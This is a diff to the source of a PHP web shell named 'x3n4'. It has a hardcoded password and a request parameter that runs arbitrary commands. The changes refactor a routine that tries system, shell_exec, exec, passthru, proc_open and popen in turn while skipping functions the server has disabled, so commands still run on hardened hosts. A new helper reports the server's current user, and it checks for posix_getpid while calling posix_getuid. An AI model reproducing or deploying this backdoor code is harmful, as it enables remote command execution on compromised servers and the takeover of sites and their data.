@@ -10,24 +10,24 @@ $password = 'P455W0rd';
  */
 function get_shell_prefix()
 {
-    return get_current_user() . '@' . php_uname('n') . ':' . getcwd() . ' $';
+    return get_user() . '@' . php_uname('n') . ':' . getcwd() . ' $';
 }
 function get_shell_command()
 {
     static $shell_command;
 
     if ($shell_command === null) {
-        if (is_callable('system') && !is_function_disabled('system')) {
+        if (is_function_available('system')) {
             $shell_command = 'system';
-        } elseif (is_callable('shell_exec') && !is_function_disabled('shell_exec')) {
+        } elseif (is_function_available('shell_exec')) {
             $shell_command = 'shell_exec';
-        } elseif (is_callable('exec') && !is_function_disabled('exec')) {
+        } elseif (is_function_available('exec')) {
             $shell_command = 'exec';
-        } elseif (is_callable('passthru') && !is_function_disabled('passthru')) {
+        } elseif (is_function_available('passthru')) {
             $shell_command = 'passthru';
-        } elseif (is_callable('proc_open') && !is_function_disabled('proc_open')) {
+        } elseif (is_function_available('proc_open')) {
             $shell_command = 'proc_open';
-        } elseif (is_callable('popen') && !is_function_disabled('popen')) {
+        } elseif (is_function_available('popen')) {
             $shell_command = 'popen';
         }
     }
@@ -100,9 +100,9 @@ function disabled_functions()
 
     return $disabled_fn;
 }
-function is_function_disabled($function)
+function is_function_available($function)
 {
-    return in_array($function, disabled_functions());
+    return is_callable($function) && !in_array($function, disabled_functions());
 }
 function output_json($output = '')
 {
@@ -152,6 +152,17 @@ function get_motd()
     }
 
     return 'Welcome to x3n4 '.X3N4_VERSION;
+}
+function get_user()
+{
+    if (
+        is_function_available('posix_getpwuid') &&
+        is_function_available('posix_getpid')
+    ) {
+        $info = posix_getpwuid(posix_getuid());
+        return $info['name'];
+    }
+    return getenv('USERNAME') ? getenv('USERNAME') : getenv('USER');
 }
 
 /**
@@ -268,7 +279,7 @@ if (isset($_REQUEST['cmd'])) {
                     </tr>
                     <tr>
                         <td>Current user:</td>
-                        <td><?php echo get_current_user(); ?></td>
+                        <td><?php echo get_user(); ?></td>
                     </tr>
                     <tr>
                         <td>Server IP:</td>
